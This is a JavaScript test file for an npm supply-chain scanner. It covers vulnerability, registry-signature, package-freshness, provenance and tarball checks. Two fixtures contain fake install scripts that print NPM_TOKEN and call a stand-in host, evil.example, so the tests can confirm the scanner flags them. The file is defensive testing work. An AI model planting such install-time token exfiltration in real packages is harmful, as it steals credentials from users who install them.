import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { gzipSync } from "node:zlib";

import { DEFAULT_CONFIG } from "../src/lib/config.js";
import { collectExternalIntelligence } from "../src/lib/intelligence.js";
import { loadProjectSnapshot } from "../src/lib/project.js";

const fixturesDir = path.join(process.cwd(), "test", "fixtures");

test("collectExternalIntelligence returns OSV and registry findings", async () => {
  const project = await loadProjectSnapshot(path.join(fixturesDir, "online-project"));
  const requests = [];
  const baseUrl = "https://mock.local";
  const config = {
    ...DEFAULT_CONFIG,
    services: {
      osv: {
        enabled: true,
        url: `${baseUrl}/v1/querybatch`,
        timeoutMs: 2000,
      },
      registry: {
        enabled: true,
        url: baseUrl,
        timeoutMs: 2000,
      },
    },
    blockRules: {
      ...DEFAULT_CONFIG.blockRules,
      requireRegistrySignatures: true,
      vulnerabilitySeverityThreshold: "high",
    },
  };

  const intelligence = await collectExternalIntelligence(project, config, {
    fetchImpl: async (url, init) => {
      requests.push(String(url));

      if (String(url) === `${baseUrl}/v1/querybatch`) {
        const parsed = JSON.parse(init.body);
        assert.equal(parsed.queries.length, 1);
        return jsonResponse({
          results: [
            {
              vulns: [
                {
                  id: "OSV-2026-1",
                  summary: "Demo high severity issue",
                  database_specific: {
                    severity: "high",
                  },
                },
              ],
            },
          ],
        });
      }

      if (String(url) === `${baseUrl}/react`) {
        return jsonResponse({
          versions: {
            "19.0.0": {
              dist: {
                integrity: "sha512-registry",
                signatures: [],
              },
            },
          },
        });
      }

      return jsonResponse({ error: "not found" }, { status: 404 });
    },
  });

  assert.ok(requests.includes(`${baseUrl}/v1/querybatch`));
  assert.ok(requests.includes(`${baseUrl}/react`));
  assert.equal(intelligence.stats.vulnerabilities, 1);
  assert.equal(intelligence.stats.directPackagesCheckedAgainstRegistry, 1);
  assert.equal(intelligence.stats.freshPackages, 0);
  assert.ok(
    intelligence.findings.some((finding) => finding.code === "known_vulnerability"),
  );
  assert.ok(
    intelligence.findings.some((finding) => finding.code === "registry_integrity_mismatch"),
  );
  assert.ok(
    intelligence.findings.some((finding) => finding.code === "missing_registry_signatures"),
  );
  assert.equal(
    intelligence.sources.every((source) => source.status === "ok"),
    true,
  );
});

test("collectExternalIntelligence warns on very fresh package releases", async () => {
  const project = await loadProjectSnapshot(path.join(fixturesDir, "online-project"));
  const baseUrl = "https://mock.local";
  const config = {
    ...DEFAULT_CONFIG,
    services: {
      ...DEFAULT_CONFIG.services,
      registry: {
        enabled: true,
        url: baseUrl,
        timeoutMs: 2000,
        warnPackageAgeDays: 30,
      },
    },
    blockRules: {
      ...DEFAULT_CONFIG.blockRules,
      minPackageAgeDays: 0,
    },
  };

  const intelligence = await collectExternalIntelligence(project, config, {
    now: new Date("2026-08-08T00:00:00Z"),
    fetchImpl: async (url) => {
      if (String(url) === `${baseUrl}/react`) {
        return jsonResponse({
          time: {
            "19.0.0": "2026-08-05T00:00:00.000Z",
          },
          versions: {
            "19.0.0": {
              dist: {
                integrity: "sha512-local",
                signatures: [{ keyid: "SHA256:demo", sig: "demo" }],
              },
            },
          },
        });
      }

      return jsonResponse({ error: "not found" }, { status: 404 });
    },
  });

  assert.equal(intelligence.stats.directPackagesCheckedAgainstRegistry, 1);
  assert.equal(intelligence.stats.freshPackages, 1);
  assert.ok(
    intelligence.findings.some(
      (finding) =>
        finding.code === "fresh_package_release" &&
        finding.severity === "warn" &&
        finding.packageName === "react",
    ),
  );
  assert.ok(
    intelligence.sources.some(
      (source) => source.name === "registry" && source.freshPackages === 1,
    ),
  );
});

test("collectExternalIntelligence maps npm audit signatures output into findings", async () => {
  const project = await loadProjectSnapshot(path.join(fixturesDir, "online-project"));
  const config = {
    ...DEFAULT_CONFIG,
    services: {
      ...DEFAULT_CONFIG.services,
      auditSignatures: {
        enabled: true,
        includeAttestations: true,
        timeoutMs: 2000,
      },
    },
    blockRules: {
      ...DEFAULT_CONFIG.blockRules,
      requireVerifiedAttestations: true,
    },
  };

  const intelligence = await collectExternalIntelligence(project, config, {
    auditSignaturesRunner: async () => ({
      exitCode: 1,
      stdout: JSON.stringify({
        invalid: [
          {
            name: "react",
            version: "19.0.0",
            message: "signature did not match",
          },
        ],
        missing: [
          {
            name: "react",
            version: "19.0.0",
            message: "missing provenance attestation",
          },
        ],
        verified: [
          {
            name: "react",
            version: "19.0.0",
          },
        ],
      }),
      stderr: "",
    }),
  });

  assert.equal(intelligence.stats.verifiedAttestations, 1);
  assert.ok(
    intelligence.findings.some((finding) => finding.code === "invalid_registry_signature"),
  );
  assert.ok(
    intelligence.findings.some(
      (finding) =>
        finding.code === "missing_verified_provenance_attestation" &&
        finding.severity === "error",
    ),
  );
  assert.ok(
    intelligence.sources.some(
      (source) =>
        source.name === "audit-signatures" &&
        source.status === "issues" &&
        source.missingEntries === 1,
    ),
  );
});

test("collectExternalIntelligence inspects install-script tarballs for suspicious indicators", async () => {
  const project = await loadProjectSnapshot(path.join(fixturesDir, "block-project"));
  const config = {
    ...DEFAULT_CONFIG,
    services: {
      ...DEFAULT_CONFIG.services,
      tarballs: {
        enabled: true,
        timeoutMs: 2000,
        maxFilesPerPackage: 4,
        maxFileBytes: 65536,
      },
    },
    blockRules: {
      ...DEFAULT_CONFIG.blockRules,
      suspiciousTarballIndicators: true,
    },
  };

  const intelligence = await collectExternalIntelligence(project, config, {
    fetchImpl: async (url) => {
      if (String(url) === "https://registry.npmjs.org/esbuild/-/esbuild-0.25.0.tgz") {
        return bufferResponse(
          createTarball({
            "package/package.json": JSON.stringify({
              name: "esbuild",
              version: "0.25.0",
              scripts: {
                install: "node install.js",
              },
            }),
            "package/install.js": [
              "const https = require('https');",
              "https.request('https://evil.example/collect');",
              "console.log(process.env.NPM_TOKEN);",
            ].join("\n"),
          }),
        );
      }

      return jsonResponse({ error: "not found" }, { status: 404 });
    },
  });

  assert.equal(intelligence.stats.tarballsInspected, 1);
  assert.equal(intelligence.stats.suspiciousTarballPackages, 1);
  assert.ok(
    intelligence.findings.some(
      (finding) =>
        finding.code === "suspicious_lifecycle_script_file" &&
        finding.severity === "error" &&
        finding.packageName === "esbuild",
    ),
  );
  assert.ok(
    intelligence.sources.some(
      (source) =>
        source.name === "tarballs" &&
        source.status === "ok" &&
        source.inspectedPackages === 1 &&
        source.suspiciousPackages === 1,
    ),
  );
});

test("collectExternalIntelligence recovers lifecycle scripts from tarballs when lockfile metadata is missing", async () => {
  const project = await loadProjectSnapshot(path.join(fixturesDir, "online-project"));
  const config = {
    ...DEFAULT_CONFIG,
    services: {
      ...DEFAULT_CONFIG.services,
      tarballs: {
        enabled: true,
        timeoutMs: 2000,
        maxFilesPerPackage: 4,
        maxFileBytes: 65536,
      },
    },
  };

  const intelligence = await collectExternalIntelligence(project, config, {
    fetchImpl: async (url) => {
      if (String(url) === "https://registry.npmjs.org/react/-/react-19.0.0.tgz") {
        return bufferResponse(
          createTarball({
            "package/package.json": JSON.stringify({
              name: "react",
              version: "19.0.0",
              scripts: {
                install: "node scripts/install.js",
              },
            }),
            "package/scripts/install.js": "console.log('hello');",
          }),
        );
      }

      return jsonResponse({ error: "not found" }, { status: 404 });
    },
  });

  assert.equal(intelligence.stats.tarballsInspected, 1);
  assert.equal(intelligence.stats.recoveredLifecycleScriptPackages, 1);
  assert.equal(intelligence.stats.suspiciousTarballPackages, 0);
  assert.equal(intelligence.recoveredLifecycleScriptPackages.length, 1);
  assert.equal(intelligence.recoveredLifecycleScriptPackages[0].name, "react");
  assert.ok(
    intelligence.findings.some(
      (finding) =>
        finding.code === "tarball_declares_lifecycle_script" &&
        finding.severity === "error" &&
        finding.packageName === "react" &&
        finding.details.scriptNames.includes("install"),
    ),
  );
  assert.ok(
    intelligence.sources.some(
      (source) =>
        source.name === "tarballs" &&
        source.status === "ok" &&
        source.inspectedPackages === 1 &&
        source.recoveredLifecycleScriptPackages === 1,
    ),
  );
});

test("collectExternalIntelligence reuses cached registry and tarball responses", async () => {
  const project = await loadProjectSnapshot(path.join(fixturesDir, "block-project"));
  const cacheDir = await mkdtemp(path.join(os.tmpdir(), "npm-protect-cache-"));
  let requests = 0;

  try {
    const config = {
      ...DEFAULT_CONFIG,
      services: {
        ...DEFAULT_CONFIG.services,
        registry: {
          enabled: true,
          url: "https://mock.local",
          timeoutMs: 2000,
          warnPackageAgeDays: 14,
        },
        tarballs: {
          enabled: true,
          timeoutMs: 2000,
          maxFilesPerPackage: 4,
          maxFileBytes: 65536,
        },
      },
      blockRules: {
        ...DEFAULT_CONFIG.blockRules,
        suspiciousTarballIndicators: true,
      },
    };

    await collectExternalIntelligence(project, config, {
      flags: {
        "cache-dir": cacheDir,
      },
      now: new Date("2026-08-08T00:00:00Z"),
      fetchImpl: async (url) => {
        requests += 1;
        if (String(url) === "https://mock.local/esbuild") {
          return jsonResponse({
            time: {
              "0.25.0": "2026-08-01T00:00:00.000Z",
            },
            versions: {
              "0.25.0": {
                dist: {
                  integrity: "sha512-esbuild",
                  signatures: [{ keyid: "SHA256:demo", sig: "demo" }],
                },
              },
            },
          });
        }

        if (String(url) === "https://registry.npmjs.org/esbuild/-/esbuild-0.25.0.tgz") {
          return bufferResponse(
            createTarball({
              "package/package.json": JSON.stringify({
                name: "esbuild",
                version: "0.25.0",
                scripts: {
                  install: "node install.js",
                },
              }),
              "package/install.js": "console.log(process.env.NPM_TOKEN); require('https').request('https://evil.example');",
            }),
          );
        }

        return jsonResponse({ error: "not found" }, { status: 404 });
      },
    });

    const cached = await collectExternalIntelligence(project, config, {
      flags: {
        "cache-dir": cacheDir,
      },
      now: new Date("2026-08-08T00:00:00Z"),
      fetchImpl: async () => {
        throw new Error("network should not be used on cached pass");
      },
    });

    assert.equal(requests, 2);
    assert.ok(
      cached.sources.some((source) => source.name === "registry" && source.cacheHits === 1),
    );
    assert.ok(
      cached.sources.some((source) => source.name === "tarballs" && source.cacheHits === 1),
    );
  } finally {
    await rm(cacheDir, { recursive: true, force: true });
  }
});

function jsonResponse(body, options = {}) {
  return {
    ok: (options.status ?? 200) >= 200 && (options.status ?? 200) < 300,
    status: options.status ?? 200,
    async json() {
      return body;
    },
  };
}

function bufferResponse(buffer, options = {}) {
  return {
    ok: (options.status ?? 200) >= 200 && (options.status ?? 200) < 300,
    status: options.status ?? 200,
    async arrayBuffer() {
      return buffer;
    },
  };
}

function createTarball(files) {
  const records = [];

  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.from(content, "utf8");
    const header = Buffer.alloc(512, 0);
    writeTarString(header, 0, 100, name);
    writeTarString(header, 100, 8, "0000777");
    writeTarString(header, 108, 8, "0000000");
    writeTarString(header, 116, 8, "0000000");
    writeTarString(header, 124, 12, data.length.toString(8));
    writeTarString(header, 136, 12, Math.floor(Date.now() / 1000).toString(8));
    header[156] = "0".charCodeAt(0);
    writeTarString(header, 257, 6, "ustar");
    writeTarString(header, 263, 2, "00");

    for (let index = 148; index < 156; index += 1) {
      header[index] = 32;
    }
    const checksum = header.reduce((sum, byte) => sum + byte, 0);
    writeTarString(header, 148, 8, checksum.toString(8));

    records.push(header, data, Buffer.alloc((512 - (data.length % 512)) % 512, 0));
  }

  records.push(Buffer.alloc(1024, 0));
  return gzipSync(Buffer.concat(records));
}

function writeTarString(buffer, offset, length, value) {
  buffer.write(String(value).slice(0, length - 1), offset, length - 1, "utf8");
}
